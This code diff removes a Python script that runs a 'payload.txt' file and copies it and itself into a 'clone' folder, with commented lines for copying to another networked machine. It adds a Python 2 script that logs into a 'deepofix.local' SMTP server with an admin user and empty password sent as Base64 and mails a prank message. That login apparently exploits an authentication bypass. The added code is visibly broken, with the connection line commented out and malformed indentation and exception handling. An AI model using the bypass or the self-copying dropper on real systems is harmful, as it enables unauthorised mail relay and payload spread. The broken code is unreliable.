@@ -1,23 +1,29 @@
+import smtplib						
+									
+# Select the sender and the receivers				
+sender = 'sender@mail'					
+receivers = ['receiver@mail.com']				
+	
+# Write the message						
+message = """							
+From: From Sender <sender@mail.com>			
+To: To Receiver <receiver@mail.com>			
+Subject: NSA is watching you!				
+	
+This is a really important message... xD		
 
-from sys import argv
-
-import os
-
-script=argv
-name=str(script[0])
-
-#create variable to start program
-cmd = 'start payload.txt'
-
-#use os module for payload
-os.system(cmd)
-
-#copy to 'clone' directory
-os.mkdir('clone')
-os.system(r"copy payload.txt clone")
-os.system(r"copy" + name + "clone")
-          
-#copy to new 'clone' directory on another computer on my network
-#os.mkdir('<filepath>\clone')
-#os.system(r"copy payload.txt '<filepath>\clone')
-#os.system(r"copy" + name + '<filepath>\clone')
+	
+# Connect to the SMTP server and send the email		
+try:								
+# server = smtplib.SMTP('deepofix.local', 25) 		
+									
+# Auth login --> admin/null in Base64			
+	server.docmd("auth login")				
+	server.docmd("YWRtaW4=")				
+	server.docmd("AA==")					
+	 								
+	server.sendmail(sender, receivers, message)         	
+		print "Successfully sent email"				
+	 								
+	except:							
+		print "Error: unable to send email"        		
